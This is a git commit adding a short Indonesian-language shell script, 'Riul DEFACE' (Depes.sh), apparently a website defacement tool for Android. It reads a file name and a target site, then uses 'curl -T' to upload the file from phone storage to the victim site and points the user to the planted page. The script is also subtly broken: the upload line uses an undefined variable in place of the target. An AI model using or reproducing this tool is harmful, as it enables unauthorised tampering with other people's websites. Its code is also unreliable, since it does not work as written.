50b77d9565b7ec70dedce72165495b909045b51e
riul-riblenk <50327463+riul-riblenk@users.noreply.github.com>
2019-06-02 14:39:59 +0700

    Add files via upload

---
+++ Depes.sh
@@ -0,0 +1,38 @@
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+toilet -f standard " Riul DEFACE "
+echo
+echo ""
+echo "==============================="
+echo $red"Created than.far©hans"
+echo $green"VERSION=0.1"
+echo "==============================="
+echo
+echo $green"*SCRIP NYA TARUH DI LUAR FOLDER INTERNAL*"
+echo $red"[+]====================================================[+]"
+echo $red"Masukan nama script"
+read -p "[=======>" script
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target"
+read -p "[=======>" Target
+curl -T /storage/emulated/0/$script $Ke1
+echo $red"[+]====================================================[+]"
+echo
+
+echo figlet -f standard "HASIL" | lolcat
+echo $red"kalau gk berhasil jangan nangis ok aekeowko"
+echo $green
+echo "Silahkan Cek Web $Target/$script"
+
+echo
+echo $cyan"KEMBALI LAGI YA GANS :)"
+echo $red"============="
+echo $yellow"============="
+echo $green"============="
+echo $blue"============="
